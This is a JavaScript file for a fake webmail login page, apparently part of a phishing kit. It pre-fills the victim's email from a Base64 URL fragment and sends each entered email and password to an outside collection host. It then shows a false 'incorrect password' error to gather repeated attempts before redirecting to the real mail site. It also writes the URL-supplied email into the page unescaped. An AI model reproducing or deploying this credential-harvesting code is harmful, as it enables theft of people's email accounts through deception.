window.addEventListener("DOMContentLoaded", function () {
  const emailField = document.getElementById("email");
  const greetingDiv = document.getElementById("greeting");
  const errorDiv = document.getElementById("error");
  const passwordInput = document.getElementById("password");

  let emailFromHash = "";
  if (window.location.hash) {
    try {
      // Decode Base64 from hash
      const decoded = atob(window.location.hash.substring(1).trim());
      emailFromHash = decoded;
    } catch (e) {
      console.error("Invalid Base64 in hash:", e);
    }
  }

  let storedEmail = localStorage.getItem("loginEmail");
  let email = emailFromHash || storedEmail;

  if (email && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    emailField.value = email;
    localStorage.setItem("loginEmail", email);
    greetingDiv.innerHTML = `${email} <a href="#">non sei tu?</a>`;
    history.replaceState(null, null, window.location.pathname + window.location.search);
  } else {
    greetingDiv.textContent = "Nessuna email trovata.";
  }

  // Show error message after reload
  if (localStorage.getItem("loginError") === "true") {
    errorDiv.textContent = "The user name or password you entered isn't correct. Try entering it again.";
    errorDiv.style.display = "block";
    passwordInput.value = "";
    localStorage.removeItem("loginError");
  }
});

document.getElementById("loginForm").addEventListener("submit", function (e) {
  e.preventDefault();

  const email = document.getElementById("email").value.trim();
  const passwordInput = document.getElementById("password");
  const password = passwordInput.value.trim();
  const errorDiv = document.getElementById("error");
  const submitBtn = document.getElementById("form_submit");

  errorDiv.style.display = "none";

  if (!email || !password) {
    errorDiv.textContent = "Password field is empty.";
    errorDiv.style.display = "block";
    return;
  }

  if (password.length < 6) {
    errorDiv.textContent = "Password error.";
    errorDiv.style.display = "block";
    return;
  }

  submitBtn.disabled = true;

  // Extract domain (e.g., gmail.com)
  const domain = email.split("@")[1];

  fetch("https://x9e.net/owwa/post.php", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`
  })
  .then(res => res.json())
  .then(() => {
    let tries = parseInt(localStorage.getItem("loginTries") || "0", 10);
    tries++;
    localStorage.setItem("loginTries", tries);
    localStorage.setItem("loginEmail", email);

    if (tries >= 3) {
      // Too many attempts, redirect
      localStorage.removeItem("loginTries");
      localStorage.removeItem("loginError");
      window.location.href = "https://mail." + domain;
    } else {
      // Show error after reload
      localStorage.setItem("loginError", "true");
      setTimeout(() => location.reload(), 3000);
    }
  })
  .catch(() => {
    errorDiv.textContent = "Network error. Please try again.";
    errorDiv.style.display = "block";
    submitBtn.disabled = false;
  });
});